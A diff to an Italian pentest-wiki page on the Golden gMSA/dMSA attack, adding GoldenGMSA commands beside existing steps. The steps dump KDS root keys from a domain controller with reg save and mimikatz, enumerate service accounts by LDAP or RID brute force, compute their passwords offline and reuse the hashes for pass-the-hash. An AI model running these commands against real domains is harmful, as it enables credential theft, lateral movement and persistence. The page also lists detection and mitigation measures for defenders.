@@ -23,7 +23,6 @@ Nessun traffico Kerberos o interazione con il dominio è richiesta durante l'uso
 
 Se un attaccante può ottenere tutti e tre gli input **offline**, può calcolare **password valide attuali e future** per **qualsiasi gMSA/dMSA nella foresta** senza toccare di nuovo il DC, bypassando:
 
-* Registri di pre-autenticazione Kerberos / richiesta di ticket
 * Audit di lettura LDAP
 * Intervalli di cambio password (possono pre-calcolare)
 
@@ -31,11 +30,12 @@ Questo è analogo a un *Golden Ticket* per gli account di servizio.
 
 ### Requisiti
 
-1. **Compromissione a livello di foresta** di **un DC** (o Amministratore di Impresa). L'accesso `SYSTEM` è sufficiente.
+1. **Compromissione a livello di foresta** di **un DC** (o Enterprise Admin), o accesso `SYSTEM` a uno dei DC nella foresta.
 2. Capacità di enumerare gli account di servizio (lettura LDAP / brute-force RID).
 3. Workstation .NET ≥ 4.7.2 x64 per eseguire [`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) o codice equivalente.
 
-### Fase 1 – Estrai la KDS Root Key
+### Golden gMSA / dMSA
+##### Fase 1 – Estrai la KDS Root Key
 
 Dump da qualsiasi DC (Volume Shadow Copy / hives SAM+SECURITY raw o segreti remoti):
 ```cmd
@@ -45,16 +45,25 @@ reg save HKLM\SYSTEM  system.hive
 # With mimikatz on the DC / offline
 mimikatz # lsadump::secrets
 mimikatz # lsadump::trust /patch   # shows KDS root keys too
+
+# With GoldendMSA
+GoldendMSA.exe kds --domain <domain name>   # query KDS root keys from a DC in the forest
+GoldendMSA.exe kds
+
+# With GoldenGMSA
+GoldenGMSA.exe kdsinfo
 ```
 La stringa base64 etichettata `RootKey` (nome GUID) è necessaria nei passaggi successivi.
 
-### Fase 2 – Enumerare gli oggetti gMSA/dMSA
+##### Fase 2 – Enumerare gli oggetti gMSA / dMSA
 
 Recupera almeno `sAMAccountName`, `objectSid` e `msDS-ManagedPasswordId`:
 ```powershell
 # Authenticated or anonymous depending on ACLs
 Get-ADServiceAccount -Filter * -Properties msDS-ManagedPasswordId | \
 Select sAMAccountName,objectSid,msDS-ManagedPasswordId
+
+GoldenGMSA.exe gmsainfo
 ```
 [`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) implementa modalità di aiuto:
 ```powershell
@@ -64,7 +73,7 @@ GoldendMSA.exe info -d example.local -m ldap
 # RID brute force if anonymous binds are blocked
 GoldendMSA.exe info -d example.local -m brute -r 5000 -u jdoe -p P@ssw0rd
 ```
-### Fase 3 – Indovina / Scopri il ManagedPasswordID (quando mancante)
+##### Fase 3 – Indovina / Scopri il ManagedPasswordID (quando mancante)
 
 Alcuni deployment *rimuovono* `msDS-ManagedPasswordId` da letture protette da ACL.  
 Poiché il GUID è a 128 bit, il bruteforce ingenuo è impraticabile, ma:
@@ -78,36 +87,36 @@ GoldendMSA.exe wordlist -s <SID> -d example.local -f example.local -k <KDSKeyGUI
 ```
 Lo strumento calcola le password candidate e confronta il loro blob base64 con il reale attributo `msDS-ManagedPassword` – la corrispondenza rivela il GUID corretto.
 
-### Fase 4 – Computazione e Conversione della Password Offline
+##### Fase 4 – Computazione e Conversione della Password Offline
 
 Una volta conosciuto il ManagedPasswordID, la password valida è a un comando di distanza:
 ```powershell
 # derive base64 password
-GoldendMSA.exe compute -s <SID> -k <KDSRootKey> -d example.local -m <ManagedPasswordID>
-
-# convert to NTLM / AES keys for pass-the-hash / pass-the-ticket
-GoldendMSA.exe convert -d example.local -u svc_web$ -p <Base64Pwd>
+GoldendMSA.exe compute -s <SID> -k <KDSRootKey> -d example.local -m <ManagedPasswordID> -i <KDSRootKey ID>
+GoldenGMSA.exe compute --sid <SID> --kdskey <KDSRootKey> --pwdid <ManagedPasswordID>
 ```
 Le hash risultanti possono essere iniettati con **mimikatz** (`sekurlsa::pth`) o **Rubeus** per l'abuso di Kerberos, abilitando un **movimento laterale** furtivo e **persistenza**.
 
 ## Rilevamento e Mitigazione
 
 * Limitare le capacità di **backup DC e lettura del registro** agli amministratori di Tier-0.
-* Monitorare la creazione della **Modalità di Ripristino dei Servizi di Directory (DSRM)** o della **Copia Shadow del Volume** sui DC.
+* Monitorare la creazione di **Directory Services Restore Mode (DSRM)** o **Volume Shadow Copy** sui DC.
 * Audit delle letture / modifiche a `CN=Master Root Keys,…` e ai flag `userAccountControl` degli account di servizio.
 * Rilevare scritture di password **base64** insolite o riutilizzo improvviso di password di servizio tra host.
-* Considerare la conversione di gMSA ad alto privilegio in **account di servizio classici** con rotazioni casuali regolari dove l'isolamento di Tier-0 non è possibile.
+* Considerare la conversione di gMSA ad alta privilegio in **account di servizio classici** con rotazioni casuali regolari dove l'isolamento di Tier-0 non è possibile.
 
 ## Strumenti
 
 * [`Semperis/GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) – implementazione di riferimento utilizzata in questa pagina.
+* [`Semperis/GoldenGMSA`](https://github.com/Semperis/GoldenGMSA/) – implementazione di riferimento utilizzata in questa pagina.
 * [`mimikatz`](https://github.com/gentilkiwi/mimikatz) – `lsadump::secrets`, `sekurlsa::pth`, `kerberos::ptt`.
 * [`Rubeus`](https://github.com/GhostPack/Rubeus) – pass-the-ticket utilizzando chiavi AES derivate.
 
 ## Riferimenti
 
-- [Golden dMSA – bypass dell'autenticazione per gli Account di Servizio Gestiti Delegati](https://www.semperis.com/blog/golden-dmsa-what-is-dmsa-authentication-bypass/)
-- [Repository GitHub di Semperis/GoldenDMSA](https://github.com/Semperis/GoldenDMSA)
+- [Golden dMSA – bypass dell'autenticazione per gli account di servizio gestiti delegati](https://www.semperis.com/blog/golden-dmsa-what-is-dmsa-authentication-bypass/)
+- [gMSA Active Directory Attacks Accounts](https://www.semperis.com/blog/golden-gmsa-attack/)
+- [Semperis/GoldenDMSA GitHub repository](https://github.com/Semperis/GoldenDMSA)
 - [Improsec – attacco di fiducia Golden gMSA](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent)
 
 {{#include ../../banners/hacktricks-training.md}}
